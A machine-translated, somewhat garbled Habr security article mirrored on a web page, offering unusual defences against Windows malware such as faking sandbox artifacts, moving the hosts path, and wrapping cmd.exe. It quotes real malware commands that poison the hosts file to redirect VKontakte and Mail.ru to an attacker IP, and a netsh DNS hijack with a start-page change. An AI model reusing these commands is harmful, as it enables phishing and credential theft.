<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Non-obvious ways to protect against malware</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="In disputes and discussions on how to protect your computer from malware, many copies are broken and many books and articles can be found on this topi...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Non-obvious ways to protect against malware</h1><div class="post__text post__text-html js-mediator-article">  In disputes and discussions on how to protect your computer from malware, many copies are broken and many books and articles can be found on this topic, and most of them simply duplicate each other, telling the same thing in different words.  Anyone who is interested in information security is extremely difficult in such discussions and articles to meet about the protection of something new, which he did not know before or simply did not think about it ... but, as it sounds arrogant, I still try to wake you up at least a bit of interest in this hackneyed topic and tell you about non-obvious ways of protection, omitting the senile grumbling about the need to update plugins to browsers in time, not to follow left links, etc. <br><br>  In this small note about some interesting features of the functioning of malware, I urge you to abandon the antivirus and other methods of self-defense - updates, program settings and care when clicking on links and launching applications ... to the word "call" we add the particle "NOT" and everything will be their places. <br><br><a name="habracut"></a>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      This article should be considered only as an unusual review of common actions in the behavior of Malvari, against which we can create protection, which should be regarded more as ‚Äúoh, cool, the malware does not work!‚Äù And as some kind of zest found in viral studies. <br><br>  You should start with the fact that the most obvious protection is to use a user account, not an administrator, but because only a few are capable of such a sacrifice, and the majority with admin rights, we will no longer return to this unpleasant topic, but in view of this, it still stands, all of a sudden, it will come in handy. <br><br>  [offtopic] my language is itching to shout that the java plugin needs to be turned off, and to turn it on only when necessary, that viewing the pdf in the browser is not particularly needed, because the files are best saved for hard, and then watch them through some kind of left one not an interesting pdf-viewer that you can turn off autorun from flash drives by inserting a couple of lines into the registry, which is ..., but all these half-obvious protection methods are known from without me, therefore I ask you to forgive everyone: those who expected a complete security analysis PC for the fact that it will not, and those who were expecting only new - for  what I remembered about this classic.  [/ offtopic] <br><br>  <b>I am a cloud, a cloud, a cloud, and not a bear</b> <br><br>  Quite a few Malvari (although rather their creators) are aware of the existence of antiviruses, virus analysts, automatic analysis systems and other infrastructure of the ‚Äúcorporation of good‚Äù and in every way try to complicate their lives and extend the life of their handicrafts by various techniques to complicate the analysis of malware and overlay on him a detect.  The simplest example of this is cryptography / packaging, which kills a small herd of hares at once: <br>  - if the malware is detected, then repacked it and again in chocolate <br>  - disassemblers / static analyzer become useless (manual parsing with a debugger is needed) <br>  - not every anti-virus emulator will unwind even a simple cryptor <br>  An example of the most that neither is banal, designed to show in what direction hackers think (in the right way they should be called criminals, but such a tradition has gone from somewhere to replace concepts ...).  And the following thought (from the face of a Malvari): if I feel that I am being investigated, I will not malign, so that they do not understand how I work or do not understand my evil essence at all.  She defines her ‚Äúsubject matter‚Äù as follows: <br><br>  <b>1.</b> Launch detection under online behavior analysis services (Anubis, ThreatExpert, ...) <br>  It is done by checking the name of the computer, the user, being in the address space of certain dll-libraries, key <br>  operating system. <br>  <b>2.</b> Virtual machine detection (VMWare, SandBox) <br>  By searching for specific processes, registry keys, hardware, identifying differences with a conventional system with different assembler tricks. <br>  <b>3.</b> Debug Detector <br>  Checking certain bytes in the environment, searching for a window, process, driver. <br>  <b>4.</b> Detection of active / passive monitoring utilities (RegMon, FileMon, RegShot) <br>  This is usually implemented by searching the window by title. <br><br>  The essence of this anti-virus protection to the ugliness is simple - let Malvari understand that it is being investigated and she herself will give up her bad intentions.  Moving from theory to practice (within reasonable limits), one can say the following (on similar points): <br>  <b>1.</b> The username and computer name is sandbox. <br>  <b>2.</b> Process in the system: vmware.exe, VMwareTray.exe.  Section HKLM \ SYSTEM \ ControlSet001 \ Services \ vmware.  File vmnet.sys drivers. <br>  <b>3.</b> Many will detect the SoftIce driver - just run it, it will throw the driver and that's it (yes, they are still looking for it!).  Window with the class "OllyDBG". <br>  <b>4.</b> Windows with the title "File Monitor - Sysinternals: <a href="http://www.sysinternals.com/">www.sysinternals.com</a> ", "Registry Monitor - Sysinternals: <a href="http://www.sysinternals.com/">www.sysinternals.com</a> ". <br>  In essence, all this is simple to do (if you wish): during installation, specify certain names, create a pair of keys / files, write a tool that will keep several windows invisible with certain names, and call the tool itself vmware.exe. <br><br>  <b>VKontakte is disabled for non-payment of hosting</b> <br><br>  Here you are funny, but many of our compatriots can see something similar on their screens.  Trojans of the Qhost class, whose task is to edit the hosts file stupidly and get away with it, thus, the left IP address is assigned to the addresses of popular social networking sites (VKontakte, classmates) ... and a person will lose his login / password, and also send SMS ... <br>  Despite the technological simplicity of creation, these Trojans bring great profit to the creators - a minimum of effort and in the short term a lot of VKontakte and money.  hosts file is edited either directly (open-&gt; record) or through command interpreters (creating and starting bat / vbs) - everything is very simple: along a certain fixed path (C: \ WINDOWS \ system32 \ drivers \ etc \ hosts) the file is in the end of which you need to add a few lines - this is the second programming lesson in any language after hello world!  And here is a little trick of protection, the fact is that the path to the etc folder is specified in the registry and if you change the path to another folder (put all the files from the previous one there, and rub them from etc), the Trojan will be somewhat surprised ... <br><br>  Here is the key: <br>  HKEY_LOCAL_MACHINE \ SYSTEM \ CurrentControlSet \ Services \ Tcpip \ Parameters \ \ DataBasePath <br>  HKEY_LOCAL_MACHINE \ SYSTEM \ ControlSet001 \ Services \ Tcpip \ Parameters \ \ DataBasePath (and for other 00X keys, respectively). <br><br>  On the level of intelligence and nationality of the authors of some Trojans of this class, you can put forward an assumption even without looking at the code: <br><br><img src="http://s020.radikal.ru/i716/1303/3b/3d51c96404ab.bmp" alt="image"><br><br>  The batniki have (for simplicity, obfuscation removed, only the TANGLE variable is left for a visual understanding of how bat files are obfuscated) as follows: <br><br><blockquote>  SET TEATEATEA =% windir% \ System32 \ drivers \ etc \ hosts <br>  SET TANGLE = .co <br>  echo 66.55.140.181 my.mail.ru &gt;&gt;% TEATEATEA% <br>  echo 66.55.140.181 m.my.mail.ru &gt;&gt;% TEATEATEA% <br>  echo 66.55.140.181 vk% TANGLE% m &gt;&gt;% TEATEATEA% </blockquote><br><br>  <b>Can you see the console?</b>  <b>Not?</b>  <b>And she is ...</b> <br><br>  When exploiting a vulnerability, the shellcode often performs various actions, manipulating cmd.exe, it‚Äôs easy to run it (the system will even find the path to it itself) and there are few letters in it and it is in the system, and this is very important for the shellcode, especially in the light of recent technologies, the change of addresses of everything that is possible in the address space. <br>  Therefore, our main task is to put hackers and then a thick, suspiciously grunting pig: you can replace the system cmd.exe (including its copies in dllcache, i386, $ NtServicePackUninstall $) with our stub, which, when called, will save the passed parameters to the buffer and issue an alert ‚ÄúContinue, or not‚Äù and with the consent of that, with the same parameters, the normal cmd (previously put side by side in the renamed form) will be launched. <br>  Modern malware does a lot of critical actions in the system by running cmd.exe with kilometer length parameters (for example, making changes to the same hosts). <br><br>  You can complicate the stub by adding the ability to read from the config to which processes not to issue an alert about the launch, but immediately transfer the parameters to the new cmd. <br>  This thought began to take shape, grow and strengthen when observing the constant approach of malware and cmd.exe - they became better friends and even more - it is Taras Bulba for them: it spawns, it kills itself - when an exploit is triggered, it is he who often launches the downloaded The malware and self-deletion method is also implemented via a bat-file, and during its operation, the malware sometimes loads the command interpreter with work. <br>  Separately, I would like to note the existence of disembodied evil-doers, who have no thin exe-file in the system, but executes everything java - the exploit tells her what to do and she obediently executes.  Here is an example from life (these actions are performed by the java.exe process): <br><br><blockquote> cmd.exe / C "ChCp 1251 &amp; netsh interface ip set dns name =" Local Area Connection "source = static addr = 5.199.140.178" <br>  reg add "hkcu \ Software \ Microsoft \ Internet Explorer \ Main" / v "Start Page" / t REG_SZ / f / d "shtpp: //dubsearch.ru" <br></blockquote><br><br>  For myself, this utility was written for research purposes; if you need source code or the tool itself, you can contact me and I will give it without problems, I don‚Äôt feel sorry. <br>  At this point, it is worth noting another important detail that imposes severe restrictions on using this protection method on a real system: if you are a licensed user of the Immunity antivirus, then there will be a lot of requests to launch batch files from our left cmd.exe. <br><br>  <b>Linux to the right, Windows to the left</b> <br><br>  It is known that the majority of malware come to our computer through a window to the Internet - through the browser and its plug-ins, therefore putting protection at this stage (File - Work offline ... a joke), we will cut off the lion's share of threats.  To do this, briefly consider the principle of the exploit pack: <br>  <b>1.</b> Information about the browser and its version, operating system and language is retrieved from the User Agent. <br>  <b>2.</b> Depending on the results of the first item (see below), the definition of which plug-ins are in general and the exploitation of their vulnerability occurs, or if there is nothing suitable among the existing exploits, nothing bad happens <br><br>  Of course, there are exceptions when, regardless of anything, all the exploits are immediately thrust into the code of the page (maybe at least something will work), but most exploit packs keep statistics, accounting by countries, have a nice interface and other goodies and settings.  Therefore, the philosophy of protection is as follows: you need to change the User Agent and indicate there something against which there is definitely no exploit reserve, such as Linux.  Ideally, of course, it would generally replace UserAgent with a Linux browser with some kind of complete browser, but this, in theory, could result in small page distortions on some sites, although I did not notice this. <br>  All the popular bundles (the same Blackhole exploit kit) will send you to communicate with Google in a moment, even without trying an exploit on your browser. <br><br>  <b>Instead of output</b> <br><br>  The article should in no way be taken as a call to abandon the antivirus and other reasonable remedies that you all know.  Just now, in addition to them, one can either use the methods I have sounded, or not use them, but simply be aware of the existence of such obstacles in the life path of the malware. </div><p>Source: <a href="https://habr.com/ru/post/172279/">https://habr.com/ru/post/172279/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../172263/index.html">Thoughts on the Facebook interface</a></li>
<li><a href="../172265/index.html">Nokia Music API</a></li>
<li><a href="../172269/index.html">Letters in html-format with attached images</a></li>
<li><a href="../172271/index.html">ExtJS4: practical impressions</a></li>
<li><a href="../172273/index.html">Intel offers to consider the display service</a></li>
<li><a href="../172281/index.html">Philips opens development program for Hue bulbs</a></li>
<li><a href="../172283/index.html">Ejabberd Crutches protection</a></li>
<li><a href="../172285/index.html">Implementing long-term arithmetic in C ++</a></li>
<li><a href="../172289/index.html">Large-scale update of the mobile version of 2GIS</a></li>
<li><a href="../172293/index.html">Technology to combat MiniDuke. Simple protection against complex threats?</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>